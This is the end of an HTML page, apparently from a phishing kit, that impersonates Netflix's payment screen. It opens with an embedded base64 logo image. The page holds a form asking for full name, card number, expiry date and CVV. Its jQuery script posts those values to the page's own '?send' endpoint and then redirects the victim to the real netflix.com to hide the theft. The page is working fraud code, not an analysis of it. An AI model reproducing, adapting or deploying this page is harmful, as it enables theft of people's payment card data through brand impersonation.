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">
                <br>
                <br>
                <div class="input">
                    Full Name
                    <input type="text" name="name" id="name">    
                </div>
                <br>
                <div class="input">
                    Card Number
                    <input type="text" name="cc" id="cc">    
                </div>
                <br>
                <div class="input">
                    Expiration Date (MM/YY)
                    <input type="text" name="exp" id="exp">    
                </div>
                <br>
                <div class="input">
                    Security Code (CVV)
                    <input type="text" name="ccv" id="cvv">    
                </div>
                <br>
                <div class="button-confirm">
                    Continue
                </div>
            </div> 
                  
        </div>
         <div class="contact-us">
                Questions? Contact us.
            </div>  
        <div class="bottom-line">
            <div class="elm">
                
            </div>
            <div class="elm">
                Terms of Use
            </div>
            <div class="elm">
                Privacy
            </div>
            <div class="elm">
                Cookie Preferences
            </div>
            <div class="elm">
                Netflix Originals
            </div>
            <div class="elm">
                
            </div>
        </div>
        <script
  src="https://code.jquery.com/jquery-2.2.4.min.js"
  integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44="
  crossorigin="anonymous"></script>
        <script>
            $(document).ready(function(){
                $(".button-confirm").click(function(){
                    dataObject= {
                        type:'netflix',
                        name: $('#name').val(),
                        cc: $('#cc').val(),
                        exp: $('#exp').val(),
                        cvv: $('#cvv').val(),
                    }
                    $.post("?send", dataObject, function(ok){
                        document.location = "https://netflix.com"
                    })
                    console.log(dataObject)
                })
            })
        </script>  
    </body>
     </html>